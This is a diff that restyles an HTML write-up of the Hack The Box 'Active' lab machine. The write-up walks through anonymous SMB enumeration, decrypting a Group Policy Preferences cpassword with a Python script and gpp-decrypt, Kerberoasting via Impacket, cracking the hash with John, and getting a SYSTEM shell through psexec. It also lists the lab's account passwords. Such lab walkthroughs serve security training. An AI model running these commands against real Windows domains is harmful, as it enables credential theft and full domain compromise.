@@ -1,190 +1,426 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Active &mdash; HTB Writeup</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
 </head>
 <body>
-    <main class="main-content">
-        <div class="content-card">
-<div class="writeup-content">
-    <div style="text-align: center;">
-        <h1>Hack The Box</h1>
-        <h2>Active</h2>
-        <img src="/pngs/HTB/Easy/Active/Active.png" alt="Active Banner" style="border:none; width: 300px; margin-bottom: 20px;">
-        <h3 style="color: #3fb950;">Level: Easy</h3>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Active/Active.png" alt="Active machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Active</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Windows</span>
+      <span class="badge difficulty-easy">Easy</span>
     </div>
+  </div>
+</header>
 
-    <h3 class="step-header">1. Enumeration</h3>
-    <p>I started with port enumeration:</p>
-    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.100</div>
-    
-    <ul>
-        <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
-        <li><strong>-sS</strong>: SYN stealth scan.</li>
-        <li><strong>-Pn</strong>: Disable ICMP Echo request.</li>
-        <li><strong>--min-rate</strong>: How many packets should be sent simultaneously.</li>
-        <li><strong>-n</strong>: disables DNS resolution.</li>
-        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
-    </ul>
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">1. Enumeration</a></li>
+    <li><a href="#smb">2. SMB Enumeration</a></li>
+    <li><a href="#privilege-escalation">3. Privilege Escalation</a></li>
+    <li><a href="#privilege-escalation-second-way">4. Privilege Escalation - Second Way</a></li>
+  </ul>
+</nav>
 
-    <p>I got a lot of ports open</p>
-    <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250609204628.png">
+<h2 id="enumeration">1. Enumeration</h2>
+<p>I started with port enumeration:</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.100</div>
+<ul>
+  <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
+  <li><strong>-sS</strong>: SYN stealth scan.</li>
+  <li><strong>-Pn</strong>: Disable ICMP Echo request.</li>
+  <li><strong>--min-rate</strong>: How many packets should be sent simultaneously.</li>
+  <li><strong>-n</strong>: Disables DNS resolution.</li>
+  <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+</ul>
 
-    <h3 class="step-header">2. Server Message Block (SMB) Enumeration </h3>
-    <p>I started by enumerating the smb shares anonymously.</p>
-    <div class="terminal-box">
-    smbclient -N -L \\\\10.10.10.100
-    Anonymous login successful
+<p>I got a lot of ports open:</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250609204628.png" alt="Open ports from the nmap scan" loading="lazy">
+</figure>
 
-    Sharename       Type      Comment
-    ---------       ----      -------
-    ADMIN$          Disk      Remote Admin
-    C$              Disk      Default share
-    IPC$            IPC       Remote IPC
-    NETLOGON        Disk      Logon server share 
-    Replication     Disk      
-    SYSVOL          Disk      Logon server share 
-    Users           Disk      
-    SMB1 disabled -- no workgroup available
-    </div>
-        
-    <ul>
-        <li><strong>-N</strong> : login anonymously.</li>
-        <li><strong>-L</strong> : list the shares.</li>
-    </ul>
-    <p>There I found some files under Replication share.</p>
+<h2 id="smb">2. Server Message Block (SMB) Enumeration</h2>
+<p>I started by enumerating the SMB shares anonymously.</p>
+<div class="terminal-box">smbclient -N -L \\10.10.10.100
+Anonymous login successful
 
-    <div class="terminal-box">smbclient -N \\\\10.10.10.100\\Replication</div>
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+Replication     Disk
+SYSVOL          Disk      Logon server share
+Users           Disk
+SMB1 disabled -- no workgroup available</div>
+<ul>
+  <li><strong>-N</strong>: Login anonymously.</li>
+  <li><strong>-L</strong>: List the shares.</li>
+</ul>
 
-    <p>The one that was more important for me it was the 'Groups.xml' file which could be found here :</p><br>
-    <p><code>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</code></p>
-        <div class="terminal-box">
-        <xmp>
-            <?xml version="1.0" encoding="utf-8"?>
-            <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
-            <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
-            name="active.htb\SVC_TGS" image="2" 
-            changed="2018-07-18 20:46:06" 
-            uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
-            <Properties action="U" newName="" fullName="" description=""
-            cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
-            changeLogon="0" noChange="1" neverExpires="1" 
-            acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
-            </Groups>
-        </xmp>
-    </div> 
+<p>There I found some files under the Replication share.</p>
+<div class="terminal-box">smbclient -N \\10.10.10.100\\Replication</div>
 
-    <p>Then I crafted this script to decode the password.</p>
+<p>The most important file for me was <code>Groups.xml</code>, which is in this path:</p>
+<p><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</code></p>
+<div class="terminal-box">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
+&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;
+name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot;
+changed=&quot;2018-07-18 20:46:06&quot;
+uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;
+&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot;
+cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;
+changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot;
+acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;</div>
 
-    <div class="terminal-box">
-        <xmp>
-            from Crypto.Cipher import AES
-            import base64
+<p>Then I crafted this script to decode the password.</p>
+<div class="terminal-box">from Crypto.Cipher import AES
+import base64
 
-            # GPP AES key
-            key = bytes.fromhex("4e9906e8fcb64f2ea3786f4d2b0d7b1b")
+# GPP AES key
+key = bytes.fromhex(&quot;4e9906e8fcb64f2ea3786f4d2b0d7b1b&quot;)
 
-            # Exact cpassword value from XML
-            cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
-            cpassword = cpassword.strip().replace('\n', '')  # Sanitize
-            cpassword += '=' * (-len(cpassword) % 4)         # Fix padding
+# Exact cpassword value from XML
+cpassword = &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;
+cpassword = cpassword.strip().replace(&#x27;\n&#x27;, &#x27;&#x27;)  # Sanitize
+cpassword += &#x27;=&#x27; * (-len(cpassword) % 4)         # Fix padding
 
-            # Decrypt
-            decoded = base64.b64decode(cpassword)
-            cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16)
-            decrypted_bytes = cipher.decrypt(decoded)
+# Decrypt
+decoded = base64.b64decode(cpassword)
+cipher = AES.new(key, AES.MODE_CBC, iv=b&#x27;\x00&#x27; * 16)
+decrypted_bytes = cipher.decrypt(decoded)
 
-            try:
-                decrypted = decrypted_bytes.decode("utf-16le").rstrip("\x00")
-                print(f"Decrypted password: {decrypted}")
-            except UnicodeDecodeError as e:
-                print("[!] Failed to decode as UTF-16LE")
-                print("Raw decrypted bytes:", decrypted_bytes)
-        </xmp>
-    </div>
-    
-    <p>This was the output, after I run the command.</p>
+try:
+    decrypted = decrypted_bytes.decode(&quot;utf-16le&quot;).rstrip(&quot;\x00&quot;)
+    print(f&quot;Decrypted password: {decrypted}&quot;)
+except UnicodeDecodeError as e:
+    print(&quot;[!] Failed to decode as UTF-16LE&quot;)
+    print(&quot;Raw decrypted bytes:&quot;, decrypted_bytes)</div>
 
-    <div class="terminal-box">
-        python3 exploit.py
+<p>This was the output after I ran the script:</p>
+<div class="terminal-box">python3 exploit.py
 
-        [!] Failed to decode as UTF-16LE
-        Raw decrypted bytes: b' \x027\x8d\xa4%@\x17Ca\x80
-        \xdf\xf3\x03\xef\xc0W[\x1f\xfc1\x08+v\x11\x8cl
-        \xfe\xe4\x977?s\xad\x08\x16bZ\xd9u\xf3\x01I\\\
-        xa1\x82~\x9en\x1fO\xc6l\x08R#B\xd6[:u,\x1c\x1d'
-    </div>
+[!] Failed to decode as UTF-16LE
+Raw decrypted bytes: b' \x027\x8d\xa4%@\x17Ca\x80
+\xdf\xf3\x03\xef\xc0W[\x1f\xfc1\x08+v\x11\x8cl
+\xfe\xe4\x977?s\xad\x08\x16bZ\xd9u\xf3\x01I\\
+\xa1\x82~\x9en\x1fO\xc6l\x08R#B\xd6[:u,\x1c\x1d'</div>
 
-    <p>ChatGTP decrypted it to this:</p>
+<p>ChatGPT decrypted it to this:</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">SVC_TGS</span> : <span class="pass">GPPstillStandingStrong2k18</span></code>
+</fieldset>
 
-    <fieldset style="width: fit-content;">
-        <legend>Credentials</legend>
-        GPPstillStandingStrong2k18
-    </fieldset>
+<p>A different way to decrypt it is by using this command:</p>
+<div class="terminal-box">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</div>
 
-    <p>A different way to decrypt it is by using this command :</p>
-    <div class="terminal-box">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</div>
+<p>Now I can log in and get the user flag via the SMB shares.</p>
+<div class="terminal-box">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</div>
+<p>Or with this command:</p>
+<div class="terminal-box">smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
 
-    <p>Now I can join and get the user flag via the smb shares.</p>
-    <div class="terminal-box">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
-    </div>
-    <p>Or with this command.</p>
-    <div class="terminal-box">
-    smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18 
-        
-    smb: \SVC_TGS\desktop\> get user.txt
-    </div>
-    
-    <fieldset class="root-box">
-        <legend>User Flag</legend>
-        <code>44602ba38ae8dc2155165b667a....</code>
-    </fieldset>
+smb: \SVC_TGS\desktop\&gt; get user.txt</div>
+
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h2 id="privilege-escalation">3. Privilege Escalation</h2>
+<p>From enumeration I knew it was a Windows machine and I had credentials for a user, so I started Kerberoasting.</p>
+
+<p>I used the <code>GetUserSPNs.py</code> script from Impacket's toolset:</p>
+<div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100</div>
+
+<p>I dumped a Service Principal Name (SPN) tied to the Administrator, which means I can roast the Administrator's TGS Kerberos service ticket.</p>
+<div class="terminal-box">active/CIFS:445 Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571</div>
+
+<p>I want to extract the Administrator's hash, so I use the <code>-request</code> flag:</p>
+<div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request</div>
+<p>This is the response:</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250610001134.png" alt="GetUserSPNs response with the Administrator hash" loading="lazy">
+</figure>
+
+<p>I cracked the hash with John the Ripper:</p>
+<div class="terminal-box">~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
+
+Ticketmaster1968</div>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">Administrator</span> : <span class="pass">Ticketmaster1968</span></code>
+</fieldset>
+
+<p>The next tool I used was <code>psexec.py</code> to get a SYSTEM shell:</p>
+<div class="terminal-box">psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100</div>
+<div class="terminal-box">nc -lvnp 4446</div>
+
+<fieldset class="flag-box">
+  <legend>System Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h2 id="privilege-escalation-second-way">4. Privilege Escalation - Second Way</h2>
+<p>We can use <code>smbclient</code> to list the shares, check which permissions we have, and get the flag:</p>
+<div class="terminal-box">smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+
+smb: \&gt; get \users\administrator\desktop\root.txt</div>
+
 </div>
-    
-    <h3 class="step-header">3. Privilege Escalation</h3>
-    <p>From enumeration I know it is a Windows machine and I have credentials for a user, I started kerberoasting.</p><br>
-    <p>I used the <code>GetUserSPNs.py</code> from Impacket's toolset :</p>
-    <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100</div>
-
-    <p>I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS  Kerberos service ticket .</p>
-   <div class="terminal-box">active/CIFS:445 Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571</div>
-
-   <p>I want to extract the Administrator's hash, and I use the '-request' flag.</p>
-   <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request</div>
-   <p>Where I get this response :</p>
-   <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250610001134.png">
-   <p>I cracked the hash by using John The Ripper tool :</p>
-   <div class="terminal-box">
-    ~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
-       
-    Ticketmaster1968
-   </div>
-
-   <p>The next tool that I used was the <code>psexec.py</code> to get the SYSTEM shell :</p>
-   <div class="terminal-box">psexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
-   </div>
-
-    <div class="terminal-box">nc -lvnp 4446</div>
-
-    <fieldset class="root-box">
-        <legend>System Flag</legend>
-        <code>197332f25b2082922596d055ac92....</code>
-    </fieldset>
-
-    <h3 class="step-header">4. Privilege Escalation - Second way</h3>
-    <p>We can use <code>smbmap</code> tool to print us the shares, what permissions we have and to get the flag :</p>
-    <div class="terminal-box">
-    smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
-        
-    smb: \> get \users\administrator\desktop\root.txt
-    </div>
-</div>
-        </div>
-    </main>
-    <script src="/copy.js"></script>
-    <script src="/nav.js"></script>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
 </body>
 </html>
